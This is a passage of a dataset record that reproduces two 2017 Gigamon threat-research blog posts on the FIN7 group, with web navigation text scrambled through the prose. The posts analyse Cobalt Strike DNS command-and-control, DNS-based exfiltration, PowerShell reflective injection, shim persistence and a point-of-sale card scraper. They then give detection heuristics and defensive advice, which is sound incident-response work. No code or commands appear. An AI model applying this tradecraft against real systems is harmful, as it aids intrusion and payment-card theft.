to confirmed control of the victim host, enabling immediate analysis of the new activity. (https://blog.gigamon.com/wp- content/uploads/2020/06/7.10_Figure-3-DNS-TXT- used-by-FIN7.png) Figure 3: The DNS TXT record staging process for Cobalt https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 7 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 Figure 3: The DNS TXT record staging process for Cobalt Strike used by FIN7. After staging, the attacker would shift to the use of DNS A resource records. When idle, the malware would make requests to the attacker-controlled domain with a pattern matching [SessionID].MaliciousDomain.com. By tracking the session IDs in observed requests, Gigamon ATR could uniquely identify compromised hosts, and alert on any possible new compromises by identifying new session IDs, even without direct visibility of hosts in certain network enclaves. Additionally, using these session IDs, Gigamon ATR tracked the volume of activity per ID to determine which hosts appeared central to the operations of the attacker. By default, the C2 server would respond to the aforementioned A record requests with ‘0.0.0.0’ when the malware should remain inactive. By tracking DNS responses of ‘0.0.0.0’, Gigamon ATR detected new attacker infrastructure even when not discovered by other heuristics, as well as tracked periods of attacker inactivity to further cement a profile of FIN7’s operational habits. It should be noted that several non-malicious domains perform similar actions and this monitoring requires additional analysis for verification. (https://blog.gigamon.com/wp- content/uploads/2020/06/7.10_Figure-4-Idle-DNS-A- R-used-by-FIN7.png) Figure 4: Idle DNS A Record queries and answers from Cobalt Strike used by FIN7. https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 8 di 15 (https://www.gigamon.com/content/gigamon/en_us/lp/free- CONTACT(https://www.gigamon.com/content/gigamon/en_us/contact- Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 CONTACT (https://www.gigamon.com/content/gigamon/en_us/lp/free- (https://www.gigamon.com/content/gigamon/en_us.html) When tasked with commands by the attackers that had results SALES trial.html) CLOUD VISIBILITY DATA CENTER VISIBILITY NETWORK SECURITY INDUSTRY COMPANY INFORMATION IN THE NEWS RESOURCES CUSTOMERS VÜE COMMUNITY GET SUPPORT OVERVIEW ALREADY A PARTNER? NOT A PARTNER? FIND A PARTNER NETWORK SECURITY DATA CENTER VISIBILITY CLOUD VISIBILITY TRAFFIC INTELLIGENCE Customers Support or output, the A resource record requests would use a pattern (https://www.gigamon.com/content/gigamon/en_us/contact- sales) Resources Solutions Products Partners DEMOS (https://www.gigamon.com/content/gigamon/en_us/contact-us.html) EN matching post.[EncryptedData]. About Us GigaVUE Cloud Suite Blog (Https://Blog.gigamon.com) Resource Library View All Customer VÜE Dashboard Contact Support Support And Services Partner Portal Login Become A Partner Technology Alliance Partners Federal Build A Zero Trust Architecture Lower Your Tool Costs Accelerate Cloud Migration GigaVUE Fabric Manager GigaVUE Appliances SSL/TLS Decryption [RandomValue].MaliciousDomain.com. By monitoring for this pattern, Gigamon ATR was able to observe data leaving the (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Company- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- (Https://Www.gigamon.com/Search- (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Customers.html) (Https://Community.gigamon.com/Gigamoncp/S/? (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Support- (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Support- (Https://Gigamon.my.site.com/Partnercommunity/S/Login) (Https://Www.gigamon.com/Content/Gigamon/En_us/Partners/Channel- (Https://Www.gigamon.com/Content/Gigamon/En_us/Partners/Technology- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Federal.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Campaigns/Zero- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cut- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Accelerate- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Management/Gigavue- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- Events Information.html) Trafﬁc/Cloud-Suite.html) Results.html? Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- And-Services/Contact-Support.html) And-Services.html) Partners/Become-A-Partner.html) Partners.html) Trust.html) Network-And-Security-Costs-By-50- Cloud-Migration.html) Fm.html) Trafﬁc/Physical-Nodes.html) Trafﬁc/Trafﬁc-Intelligence/Gigasmart/Ssl-Tls- (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/News- Financial Services environment and, although encrypted, make rough &T=All&Sort=Relevancy#T=Resources) Links&Utm_content=Nav-Support) Percent.html) Decryption.html) Careers AWS And-Events/Events.html) Education Services Policies Channel Partners (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Financial- Stronger Security Starts With Network Visibility Acquire Multi-Cloud Observability GigaSMART HC Series determinations on approximate volume of data loss. DNS A scale data exfiltration. (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Careers.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Public- Cloud Journey Podcast Discussion Forum (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Education- (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Policies.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Partners/Channel- Services.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Security- Make Network Changes Without Disruption (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Multi- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- Application Filtering record C2 results in a slower data channel due to limitations in Newsroom Cloud/Gigavue-Cloud-Suite-Aws.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Resources/Navigating- (Https://Community.gigamon.com/Gigamoncp/S/Answers- Services.html) Partners.html) Operations.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Make- Cloud.html) Trafﬁc/Trafﬁc-Intelligence/Gigasmart.html) Trafﬁc/Physical-Nodes/Gigavue-Hc-Series.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- the DNS specification and hampers the ability to conduct large Customers (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/News- Warranty Healthcare Life-In-The-Cloud-Podcast.html) And-Articles#Forums? Network-Changes-Without-Disruption.html) Trafﬁc/Application-Intelligence/Application- (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Customers.html) Azure And-Events/Newsroom.html) Professional Services (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Warranty.html) Partner Locator (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Healthcare.html) Assure Cloud Security And Compliance Network TAPs Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- Filtering-Intelligence.html) Learning Center (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Public- (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Professional- (Https://Gigamon.my.salesforce- Put NetOps Back In Control (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Assure- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- IoT, OT, ICS Links&Utm_content=Nav-Support) (Https://Www.gigamon.com/Content/Gigamon/En_us/Resources/Learning- Cloud/Gigavue-Cloud-Suite-Azure.html) Services.html) Sites.com/Partnerlocator/) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Network- Cloud-Security-Compliance.html) Trafﬁc/Network-Taps.html) Application Metadata (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/IOT.html) Center.html) Knowledge Articles Operations.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- Google Cloud Reduce Cloud Cost And Complexity Trafﬁc Aggregators State, Local, Education (Https://Community.gigamon.com/Gigamoncp/S/Answers- Trafﬁc/Application-Intelligence/Application- Webinars (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Public- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Manage- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Sled.html) And-Articles? Metadata.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Resources/Resource- Cloud/Gigavue-Cloud-Suite-Google-Cloud- Cloud-Cost-Complexity.html) Trafﬁc/Trafﬁc-Aggregators.html) Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- Service Providers Library/Webinar-Hub.html) Platform.html) Links&Utm_content=Nav-Support) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Service- Kubernetes Provider.html) can be abstracted to allow for general purpose detection of Product Documentation (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- (Https://Community.gigamon.com/Gigamoncp/S/Docs? Cloud/Gigavue-Cloud-Suite-Kubernetes.html) Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- Figure 5: DNS queries indicating the exﬁltration of information by Cobalt Strike. following characteristics may identify suspicious DNS behavior Strike’s default configuration of DNS C2, aspects of this activity malware using DNS command and control methods. The While the patterns presented above are specific to Cobalt (note: multiple legitimate solutions use similar schemes to Nutanix Links&Utm_content=Nav-Support) communicate. These behaviors, like most heuristic-based (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- analytics, will likely have high initial false positive rates, and Cloud/Gigavue-Cloud-Suite-Nutanix.html) require tuning to each environment): OpenStack (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- Large TXT or A resource record requests with a high Cloud/Gigavue-Cloud-Suite-Openstack.html) entropy and a low TTL value VMware A record requests that receive an answer of “0.0.0.0” or (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- “127.0.0.1” on a repeating or regular schedule Cloud/Gigavue-Cloud-Suite-Vmware.html) Significant number of requests to the same suspicious https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 9 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 domain in short bulk time periods. Domains might be considered suspicious based on their age, rarity in relation to other observed networks, the number of assets communicating to the domain and other such environment-specific correlations DNS Domain Conﬁguration One unique aspect of the observed FIN7 infrastructure is the configuration pattern of their C2 domain. The actors use a primary domain that remains parked and setup subdomains with the pattern [random hostname][1-5] (ie. www1) off of the second-level domain. The Cobalt Strike malware will attempt to access these subdomains in a rotational pattern. FIN7 likely uses this structure as a method of surviving mitigation activities in the case their target takes action against a single subdomain. Alternate Command and Control In our observations, it is not uncommon for network defense teams to hone in on a specific threat involved in an incident, and tailor detection around known intelligence. This behavior presents a risk by potentially resulting in a failure to identify other unobserved attacker TTPs; as the saying goes, “You only know what you know.” Gigamon ATR uses network-wide visibility to not only detect previously known patterns or IOCs, but also to enable analysts to hunt for new or shifting TTPs. Outside of FIN7’s operational hours, Gigamon ATR observed the actors spawning additional connections from compromised assets to the same low-reputation VPS provider used for DNS C2. This encrypted connection used TCP with a destination port of 443, but was not standard TLS or SSL. This non-standard traffic, https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 10 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 when combined with reuse of similar network space, enabled Gigamon ATR to quickly identify and track the activity. These long-duration connections contained low packet sizes, approximately 90 bytes, likely a simple heartbeat for connection keep alive. (https://atr-blog.gigamon.com/wp- content/uploads/2018/11/7.10_Figure-6-Sample-of- Encrypted-C2v2.png) Figure 6: Sample of encrypted C2 patterns. Lateral Spread and Network Exploration Throughout our engagements with FIN7, Gigamon ATR observed heavy use of compromised credentials, specifically domain administrator accounts, to move throughout the environment. Notably, FIN7 would frequently use the psexec_psh (https://blog.cobaltstrike.com/2015/07/29/cobalt- strike-2-5-advanced-pivoting/) command within Cobalt Strike, which uses the RPC Service Controller protocol to create a service on a remote host with the binary path set to execute a malicious PowerShell command. https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 11 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 (https://blog.gigamon.com/wp- content/uploads/2020/06/7.10_Figure-7-Service- Controller-calls.png) Figure 7: Service controller calls for psexec_psh. (https://blog.gigamon.com/wp- content/uploads/2020/06/7.10_Figure-8-abridged- value-of-binary-path-for-new-service.png) Figure 8: An abridged value of the binary path for the new service. FIN7 showed little regard for operational security (OpSec) in their lateral spread, nor caution around key assets in the environment. While it appeared as though the access to payment information was the key focus of the operations, Gigamon ATR observed the group constantly exploring other enclaves of the target environment. In one instance, Gigamon ATR observed the threat actors pivot from a remote POS environment to compromise a domain controller, then from the domain controller to assets in other corporate subnets. By monitoring flow data for key assets, Gigamon ATR detected abnormalities originating from compromised remote locations and identified odd directionality involved with credential use. Conclusion https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 12 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 Throughout our engagements with FIN7, it became clear that while certain components of their operations were automated, the large majority of their activities appeared to be interactive in nature. When dealing with an interactive adversary such as this, traditional steps of the incident response process can be painstaking and require additional coordination or effort. In contrast to automated malware infections, interactive threat actors may detect and respond to containment actions, modify TTPs to avoid detection, and work to stay ahead of the response team’s decision-making processes. In spite of this challenge, profiling and monitoring an interactive adversary allows defenders to gain insight into the attacker’s thought processes, procedures and ultimately the patterns of their behaviors and activity. By modeling and recognizing those patterns, understanding why the adversary performs certain actions, and knowing how to line up response to outperform an interactive actor, responders can complete thorough and effective mitigations of this activity. It is easy to surrender to passive disengaged monitoring when dealing with encrypted command and control protocols, but so much can be gained from black-box analysis of the patterns in the protocol. In these engagements, Gigamon ATR was able to profile phases of tactical action and track the adversary by understanding the specifics of their C2 protocols. We hope that this information acts a good resource for those dealing with FIN7, as well as other unknown threats in their environment. https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 13 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 In the second part of the series (/2017/07/26/footprints-of-fin7- tracking-actor-patterns-part-2/), Gigamon ATR discusses the end goal of FIN7, and presents technical details of their financial compromise capabilities. To learn more about ATR, please visit www.gigamon.com/research/applied-threat-research- team.html (https://www.gigamon.com/research/applied-threat- research-team.html). This two-part blog series is a joint research post by Gigamon ATR and PwC. Part two can be found here (/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/). Footprints of FIN7: Tracking Actor Patterns (Part What I Learned at Black Hat 2017: Everyone OLDER ARTICLE NEWER ARTICLE 2) Needs Better Network Visibility (https://blog.gigamon.com/2017/07/26/footprints- (https://blog.gigamon.com/2017/08/01/what-i- of-ﬁn7-tracking-actor-patterns-part-2/) learned-at-black-hat-2017-everyone-needs- better-network-visibility/) (https://www.twitter.com/gigamon) (https://www.youtube.com/channel/UC6Vd7BRPT3wDE9DkEJNYinA) (https://www.linkedin.com/company/gigamon) (https://www.facebook.com/gigamon/) Website Terms (https://www.gigamon.com/content/gigamon/en_us/terms-agreement.html) Privacy Policy (https://www.gigamon.com/content/gigamon/en_us/privacy-policy.html) Cookie Policy (https://www.gigamon.com/content/gigamon/en_us/cookie-policy.html) Security (https://www.gigamon.com/content/gigamon/en_us/security-disclosure.html) Legal (https://www.gigamon.com/content/gigamon/en_us/legal.html) © Gigamon 2024 https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 14 di 15"
fin7,cti-hal,d05dd61b6abe,G0046,"Footprints of FIN7: Tracking Actor Patterns (Part 2) - Gigamon Blog 09/09/24, 12:50 SECURITY (HTTPS://BLOG.GIGAMON.COM/CATEGORY/SECURITY/) / JULY 26, 2017 Footprints of FIN7: Tracking Actor Patterns (Part 2) ATR (https://blog.gigamon.com/author/atrteam/) Justin Warner (https://blog.gigamon.com/author/justin- warner/) Stephen Hinck (https://blog.gigamon.com/author/stephen- hinck/) This is part two of a blog series detailing Gigamon Applied Threat Research’s (ATR) engagements with FIN7 throughout early 2017. Part one (https://blog.gigamon.com/2017/07/25/footprints-of-fin7- tracking-actor-patterns-part-1//) focused the network communications and tradecraft involved with FIN7, specifically addressing how patterns in the C2 protocol allowed for Gigamon ATR to gain a deeper understanding of adversary TTPs. In this https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/ Pagina 2 di 10 Footprints of FIN7: Tracking Actor Patterns (Part 2) - Gigamon Blog 09/09/24, 12:50 post, we will break out one of the ways in which FIN7 profits from their victims — compromise of point-of-sale (POS) environments and theft of cardholder data. End Goal: Financial Gain Based on victimology, internal attacker actions and known data exfiltration, many people have demonstrated FIN7’s clear financial motivations (https://www.fireeye.com/blog/threat- research/2017/04/fin7-phishing-lnk.html). With that said, up until recently, little detail has been shared about the tradecraft employed to accomplish that objective. During our engagements, Gigamon ATR observed a standalone utility that appeared to be custom in nature and used specifically to target POS systems. Multi-Stage Dropper During post-exploitation, FIN7 would gain access to the POS environment primarily using PSExec (https://technet.microsoft.com/en- us/sysinternals/bb897553.aspx), combined with a custom PowerShell script to deploy their payload. The weaponized PowerShell script was built to load an embedded DLL using reflective injection. While the PowerShell code appeared to include several foundational components from PowerSploit’s Invoke-ReflectivePEInjection (https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke- ReflectivePEInjection.ps1), it also contained custom modifications that made it unique. https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/ Pagina 3 di 10 Footprints of FIN7: Tracking Actor Patterns (Part 2) - Gigamon Blog 09/09/24, 12:50 To perform the exploit, the script executed code from PowerSploit designed to resolve Windows API functions necessary for performing the injection. Next, the script would allocate memory in its current process and use the System.Runtime.Interopservices.Marshal class to copy code into the newly allocated memory. With the DLL in memory, the script would then generate custom bootstrap code for binary loading and place that code into memory. Finally, the script would create a thread at the offset of the bootstrap code that will in turn load the malicious payload from memory. (https://blog.gigamon.com/wp- content/uploads/2020/06/1-7-25-Figure-9-ex-of- bootstrap-generation-code.png) Figure 9: An example of the bootstrap generation code. Once injected, the payload proceeded to write a binary encoded blob into the registry key HKLM\Software\Microsoft\DRM and install persistence using a custom Shim targeting services.exe and adding it to the shim database by executing sdbinst.exe (https://www.fireeye.com/blog/threat- research/2017/05/fin7-shim-databases-persistence.html). When services.exe is executed on boot, the blob, which is primarily composed of a POS scraping capability, is loaded. https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/ Pagina 4 di 10 Footprints of FIN7: Tracking Actor Patterns (Part 2) - Gigamon Blog 09/09/24, 12:50 (https://blog.gigamon.com/wp-content/uploads/2020/06/2-7- 25-Figure-10-Multistage-Loading-Process.png) Figure 10: Multistage loading process. Based on previous public documentation of FIN7 operations (https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim- databases-persistence.html), this custom PowerShell loader is a notable divergence from previous FIN7 operational tactics (https://www.gigamon.com/content/gigamon/en_us.html) (https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim- CONTACT (https://www.gigamon.com/content/gigamon/en_us/lp/free- COMPANY INFORMATION IN THE NEWS RESOURCES CUSTOMERS VÜE COMMUNITY GET SUPPORT OVERVIEW ALREADY A PARTNER? CLOUD VISIBILITY NOT A PARTNER? FIND A PARTNER INDUSTRY NETWORK SECURITY DATA CENTER VISIBILITY CLOUD VISIBILITY TRAFFIC INTELLIGENCE DATA CENTER VISIBILITY NETWORK SECURITY Customers Support SALES trial.html) databases-persistence.html); a shift in techniques possibly to (https://www.gigamon.com/content/gigamon/en_us/contact-us.html) (https://www.gigamon.com/content/gigamon/en_us/contact- sales) Resources DEMOS Partners Solutions Products EN evade detection based on intel reporting. About Us GigaVUE Cloud Suite Blog (Https://Blog.gigamon.com) Resource Library View All Customer VÜE Dashboard Contact Support Support And Services Partner Portal Login Become A Partner Technology Alliance Partners Federal Build A Zero Trust Architecture Lower Your Tool Costs Accelerate Cloud Migration GigaVUE Fabric Manager GigaVUE Appliances SSL/TLS Decryption (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Company- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- (Https://Www.gigamon.com/Search- (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Customers.html) (Https://Community.gigamon.com/Gigamoncp/S/? (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Support- (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Support- (Https://Gigamon.my.site.com/Partnercommunity/S/Login) (Https://Www.gigamon.com/Content/Gigamon/En_us/Partners/Channel- (Https://Www.gigamon.com/Content/Gigamon/En_us/Partners/Technology- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Federal.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Campaigns/Zero- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cut- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Accelerate- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Management/Gigavue- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- Events Notably, there is an inherent risk of detection that an adversary Information.html) Trafﬁc/Cloud-Suite.html) Results.html? Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- And-Services/Contact-Support.html) And-Services.html) Partners/Become-A-Partner.html) Partners.html) Trust.html) Network-And-Security-Costs-By-50- Cloud-Migration.html) Fm.html) Trafﬁc/Physical-Nodes.html) Trafﬁc/Trafﬁc-Intelligence/Gigasmart/Ssl-Tls- (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/News- Financial Services must evaluate when deploying a persistence mechanism, Decryption.html) &T=All&Sort=Relevancy#T=Resources) Links&Utm_content=Nav-Support) Percent.html) Careers AWS And-Events/Events.html) Education Services Policies Channel Partners (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Financial- Stronger Security Starts With Network Visibility Acquire Multi-Cloud Observability GigaSMART HC Series especially in POS environments that experience relatively little performing smash and grab campaigns. from a single target environment over time, rather than day-to-day changes. This shift identifies a likely desire to (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Careers.html) Cloud Journey Podcast Discussion Forum (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Education- (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Policies.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Partners/Channel- Services.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Security- Make Network Changes Without Disruption (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Multi- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- Application Filtering (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Public- Newsroom Cloud/Gigavue-Cloud-Suite-Aws.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Resources/Navigating- (Https://Community.gigamon.com/Gigamoncp/S/Answers- Services.html) Partners.html) Operations.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Make- Cloud.html) Trafﬁc/Trafﬁc-Intelligence/Gigasmart.html) Trafﬁc/Physical-Nodes/Gigavue-Hc-Series.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- Customers (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/News- Warranty Healthcare maintain longer-term access in order to facilitate ongoing theft Life-In-The-Cloud-Podcast.html) And-Articles#Forums? Network-Changes-Without-Disruption.html) Trafﬁc/Application-Intelligence/Application- (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Customers.html) Azure And-Events/Newsroom.html) Professional Services (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Warranty.html) Partner Locator (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Healthcare.html) Assure Cloud Security And Compliance Network TAPs Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- Filtering-Intelligence.html) Learning Center (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Public- (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Professional- (Https://Gigamon.my.salesforce- Put NetOps Back In Control (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Assure- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- IoT, OT, ICS Links&Utm_content=Nav-Support) (Https://Www.gigamon.com/Content/Gigamon/En_us/Resources/Learning- Services.html) Sites.com/Partnerlocator/) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Network- Cloud-Security-Compliance.html) Trafﬁc/Network-Taps.html) Application Metadata Cloud/Gigavue-Cloud-Suite-Azure.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/IOT.html) Center.html) Knowledge Articles (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- Operations.html) Google Cloud Reduce Cloud Cost And Complexity Trafﬁc Aggregators State, Local, Education (Https://Community.gigamon.com/Gigamoncp/S/Answers- Trafﬁc/Application-Intelligence/Application- Webinars (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Public- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Manage- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Sled.html) And-Articles? Metadata.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Resources/Resource- Cloud/Gigavue-Cloud-Suite-Google-Cloud- Cloud-Cost-Complexity.html) Trafﬁc/Trafﬁc-Aggregators.html) Scraper Payload https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/ Pagina 5 di 10 Footprints of FIN7: Tracking Actor Patterns (Part 2) - Gigamon Blog 09/09/24, 12:50 Once running, the POS scraping capability will attempt to inject Library/Webinar-Hub.html) Platform.html) Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- Service Providers itself into svchost.exe, wuauclt.exe or explorer.exe (in that order). Links&Utm_content=Nav-Support) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Service- Kubernetes Upon successful injection, the scraper enumerates running Provider.html) Product Documentation (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- processes, comparing them to a list provided via a text file on (Https://Community.gigamon.com/Gigamoncp/S/Docs? Cloud/Gigavue-Cloud-Suite-Kubernetes.html) disk. This tactic of using a targeted set of processes allows the malware to be used flexibly in different environments and shows Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- Nutanix Links&Utm_content=Nav-Support) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- customization in targeting based on each individual victim. Cloud/Gigavue-Cloud-Suite-Nutanix.html) Once the scraping capability has identified a process of interest, OpenStack the payload will read memory from the process and extract track (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- one and track two data formats. Once extracted, the malware Cloud/Gigavue-Cloud-Suite-Openstack.html) encrypts the data and writes it to disk for later collection by the VMware threat actors. (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- Cloud/Gigavue-Cloud-Suite-Vmware.html) Point-of-Sale Considerations While working with customers of all different sizes and across industries, Gigamon ATR has seen a large mix of architectures that have had both successes and failures, largely as a result of decisions made during the design process. We work with our customers to understand how their individual environment design affects their ability to perform network monitoring, but by the time we are brought in to assist in response it’s too late and the priority is containment, mitigation and remediation with the topic of design being revisited in the wake of the breach. With that said, we hope to present some considerations that apply specifically to protecting and monitoring POS environments: Network isolation: POS systems and processing servers should be relatively isolated, with strict access controls https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/ Pagina 6 di 10 Footprints of FIN7: Tracking Actor Patterns (Part 2) - Gigamon Blog 09/09/24, 12:50 applied in the environment. In most POS environments, remote networks (such as those found in storefronts) have no need to connect directly to each other, instead network communication should exist only between the remote networks, and any centralized processing or storage resources. Where possible, Gigamon ATR recommends the application of network controls that enforce this model. Monitoring coverage: Wherever possible, Gigamon ATR recommends backhauling all internet traffic through centralized points of presence for ease of consistent monitoring. On multiple occasions, Gigamon ATR has witnessed the use of split tunneling (sending local traffic directly to the internet) create difficulties in monitoring that traffic. This hinders or prevents the ability to detect malware communicating external to the environment. Proxying and logging all network communications from POS systems, preferably in a robust security stack that allows for behavioral profiling, enables the detection of, and response to, threats in the environment. Behavioral monitoring: Network traffic behavior in POS environments should be fairly predictable, and deviations from that behavior should warrant additional investigation. By monitoring and baselining network flows within the POS environment, defenders can identify changes to those patterns. Some examples of patterns to watch include: network traffic volume, hosts communicating with each other, the direction of that communication and the amount of data transmitted. Application whitelisting: Similar to network behaviors, the applications running in POS environments remain fairly https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/ Pagina 7 di 10 Footprints of FIN7: Tracking Actor Patterns (Part 2) - Gigamon Blog 09/09/24, 12:50 static. Baselining the environment, and then applying controls that allow only a small set of required applications to execute on hosts involved in processing payment data, can prevent attackers from ever gaining a foothold on those systems. Host-based firewalls: In addition to whitelisting applications allowed to execute on system involved in processing payment data, whitelisting the ports and IPs that each system is allowed to communicate on will help to prevent lateral movement within the POS environment. Controlling network traffic, particularly on ports used for system management (commonly used for lateral movement), ensures that such activity can only occur from certain hosts, and can greatly increase (if not prevent completely, in combination with other controls) the amount of time it takes to pivot within the POS environment, increasing the likelihood of discovery of an 